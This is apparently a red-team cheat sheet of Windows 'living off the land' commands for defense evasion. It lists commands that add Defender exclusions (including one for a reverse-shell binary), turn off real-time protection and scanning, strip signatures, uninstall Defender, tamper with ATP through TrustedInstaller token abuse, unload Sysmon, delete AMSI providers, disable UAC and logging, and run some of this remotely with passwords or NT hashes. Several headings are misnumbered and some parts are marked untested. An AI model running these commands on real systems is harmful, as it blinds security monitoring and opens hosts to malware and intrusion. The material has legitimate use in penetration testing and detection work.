# Living off the Land

## 01 - Enumerate Execlusions

### 1.2 - PowerShell

```
PS C:\> Get-MpPreference | Select-Object Exclusion*

PS C:\> Get-MpPreference | Select-Object ExclusionExtension, ExclusionIpAdress, ExclusionPath, ExclusionProcess
```

## 01 - Add Exclusions

> [!INFO] Elevated Privileges is Required
> You must run this as administrator add any exclusions.

### 1.1 - Command Prompt

```
C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"

C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"\Temp\\"

C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\".dll\"

C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"rundll32.exe\"
```

### 1.2 - PowerShell

```
PS C:\> Add-MpPreference -ExclusionPath C:\Windows\Temp

PS C:\> Add-MpPreference -ExclusionProcess powershell.exe

PS C:\> Add-MpPreference -ExclusionExtension ".exe"

PS C:\> Add-MpPreference -ExclusionExtension ".bat"

PS C:\> Add-MpPreference -ExclusionPath C:\Windows\Temp\reverseshell.exe
```

## 02 - Windows Security

### 2.1 - Disable

#### 2.1.1 - Command Prompt

```
C:\> net.exe stop "Security Center"
```

Note: Just the rest of these are not tested just yet

```
C:\> net.exe stop "WdNisSvc"

C:\> net.exe stop "WdNisDrv"

C:\> net.exe stop "WdFilter"

C:\> net.exe stop "WdBoot"

C:\> net.exe stop "wcncsvc"
```

#### 2.1.2 - PowerShell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true

Set-MpPreference -DisableBehaviorMonitoring $true

Set-MpPreference -DisableIntrusionPreventionSystem $true

Set-MpPreference -SubmitSamplesConsent 2

Set-MpPreference -PUAProtection Disable

Set-MpPreference -DisablePrivacyMode $true

Set-MpPreference -MAPSReporting 0

Set-MpPreference -HighThreatDefaultAction 6 -Force

Set-MpPreference -ModerateThreatDefaultAction 6

Set-MpPreference -LowThreatDefaultAction 6

Set-MpPreference -SevereThreatDefaultAction 6

Set-MpPreference -DisableIOAVProtection $true

Set-MpPreference -DisableScriptScanning $true

Set-MpPreference -DisableArchiveScanning $true

Set-MpPreference -DisableCatchupFullScan $true

Set-MpPreference -DisableCatchupQuickScan $true

Set-MpPreference -DisableEmailScanning $true

Set-MpPreference -DisableRemoveableDriveScanning $true

Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true

Set-MpPreference -DisableScanningNetworkFiles $true

Set-MpPreference -DisableBlockAtFirstSeen $true

Set-MpPreference -EnableControlledFolderAccess Disabled

Set-MpPreference -ScanScheduleDay 8
```

### 2.2 - Remove Definitions

#### 2.2.1 - Command Prompt

```
C:\> "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -all

C:\> winrs.exe -remote:<IP> "\"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -all"
```

#### 2.2.2 - PowerShell

```
PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -all }
```

### 2.3 - Uninstall

#### 2.3.1 - Command Prompt

```
C:\> Dism.exe /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
```

#### 2.3.2 - PowerShell

```
PS C:\> Uninstall-WindowsFeature -Name Windows-Defender

PS C:\> Remove-WindowsFeature -Name Windows-Defender -Restart
```

## 03 - Disable Advanced Threat Protection

### 3.1 - Disable Endpoint

#### 3.1.1 - Command Prompt

```
C:\> sc.exe config TrustedInstaller binpath="cmd /c sc stop diagtrack & sc config diagtrack binpath='useless value'" && sc start TrustedInstaller

C:\> whoami.exe /groups | findstr.exe Trusted

C:\> ren.exe "C:\Program Files\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" SenseCncProxi.exe
```

#### 3.1.2 - PowerShell

```powershell
PS C:\> Set-NtTokenPrivilege SeDebugPrivilege
Start-Service TrustedInstaller
$process = Get-NtProcess -Name TrustedInstaller.exe
$token = $process.OpenToken()
$token.Groups | Where-Object ($_.$id.Name -match "TrustedInstaller")
$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $process
```

## 04 - Sysinternals

### 4.1 - Sysmon

#### 4.1.1 - Disable

Get driver for Sysmon and disable it.

```
C:\> fltmc.exe

C:\> fltmc.exe unload SysmonDrv
```

Disable Sysmon service.

```
C:\> sc.exe stop Sysmon64
```

Change configuration for sysmon to make it useless or reduce the ruleset to evade detection.

```
C:\> Sysmon64.exe -c sysmonconfig-export.xml
```

Change to default settings.

```
C:\> Sysmon64.exe -c --
```

#### 4.1.2 - Uninstall

Note: You must have administrative privileges

```
C:\> Sysmon64.exe -u
```

## 05 - Disable AMSI

### 5.1 - PowerShell

```
PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force }
```

```
PS C:\> Get-WmiObject -Namespace root\microsoft\protectionmanagement -Class msft_mpcomputerstatus

PS C:\> Get-CimInstance -Namespace root\microsoft\protectionmanagement -Class msft_mpcomputerstatus
```

#### 1.2.3.2 - Windows Security

##### 1.2.3.2.1 - Command Prompt

```
C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] product where name="Microsoft Security Client" call uninstall /nointeractive
```

## 1.3 - Registry

### 1.3.1 - Disable Windows Security

#### 1.3.1.1 - Disable Real Time Protection

##### 1.3.1.1.1 - Command Prompt

```batch
C:\> reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
```

Delete the whole registry

```
C:\> reg.exe delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
```

##### 1.3.1.1.2 - PowerShell

```powershell
PS C:\> Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowFastServiceStartup" -Type DWord -Value 0

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Type DWord -Value 0

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Type DWord -Value 1

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection"

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Type DWord -Value 1

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Type DWord -Value 1

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Type DWord -Value 1

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Type DWord -Value 1

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Type DWord -Value 1

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Spynet"

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Type DWord -Value 1

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "LocalSettingOverrideSpynetReporting" -Type DWord -Value 0

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Type DWord -Value 2

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Type DWord -Value 2

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "MpEngine"

Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpCloudBlockLevel" -Type DWord -Value 2

Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Type DWord -Value 4

gpupdate.exe /force
```

#### 1.3.1.2 - Disable Windows Defender Services

##### 1.3.1.2.1 - Command Prompt

Note: Run this again because Windows Defender is very persistent

```batch
C:\> reg.exe add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f

reg.exe add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f

reg.exe add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f

reg.exe add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f

reg.exe add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f

reg.exe add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```

##### 1.3.1.2.2 - PowerShell

TODO: Complete this

#### 1.3.1.3 - Disable Logging

##### 1.3.1.3.1 - Command Prompt

```
C:\> reg.exe add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

reg.exe add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
```

#### 1.3.1.4 - Disable Systray Icon

##### 1.3.1.4.1 - Command Prompt

```
C:\> reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f

reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f

reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
```

### 1.3.2 - Disable Windows Defender Security Center

#### 1.3.2.1 - Command Prompt

```
C:\> reg.exe add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
```

### 1.3.3 - Remove Windows Defender Context Menu

#### 1.3.3.1 - Command Prompt

```
C:\> reg.exe delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f

reg.exe delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f

reg.exe delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
```

#### 1.3.3.2 - Regshell

TODO: Complete this

```
$ regshell -U "<domain>/<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>

\> predef HKEY_LOCAL_MACHINE
rmkey HKCR\Directory\shellex\ContextMenuHandlers\EPP
rmkey HKCR\Drive\shellex\ContextMenuHandlers\EPP
```

## 1.4 - Schtasks

```
C:\> schtasks.exe /change /tn "Microsoft\Windows\ExploitGuard\ExploitGuard MDM Policy Refresh" /disable

schtasks.exe /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /disable

schtasks.exe /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable

schtasks.exe /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable

schtasks.exe /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Verification" /disable
```

## 1.5 - Msiexec

### 1.5.1 - Uninstall Endpoint

Enumerate installed endpoints.

```
C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] product get name,identifyingnumber

C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] /namespace:\\root\securitycenter2 path antivirusproduct

C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] /namespace:\\root\securitycenter2 path antivirusproduct get * /format:list

C:\> wmic.exe [/node:<IP>] [/user:<username> /password:<password>] /namespace:\\root\securitycenter2 path antivirusproduct get displayname
```

Uninstall.

```
C:\> msiexec.exe /q /qn /norestart /uninstall {<GUID>}
```

PowerShell

```
PS C:\> Get-CimInstance -ClassName Win32_Product | Select-Object -Property IdentifyingNumber, Name

PS C:\> Get-WmiObject -ClassName Win32_Product | Select-Object -Property IdentifyingNumber, Name
```

---
## References

### Microsoft

- [Sysinternals: Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

### LOLBAS

- [LOLBAS: fltMC](https://lolbas-project.github.io/lolbas/Binaries/FltMC/)

### LOFLCAB

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

- [LOFLCAB: Add-MpPreference](https://lofl-project.github.io/loflcab/Cmdlets/Add-MpPreference/)

### Red Team Notes

- [Red Team Notes: Unloading Sysmon Driver](https://www.ired.team/offensive-security/defense-evasion/unloading-sysmon-driver)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)

### Github

- [olafhartong: Sysmon Modular](https://github.com/olafhartong/sysmon-modular)

- [SwiftOnSecurity: Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)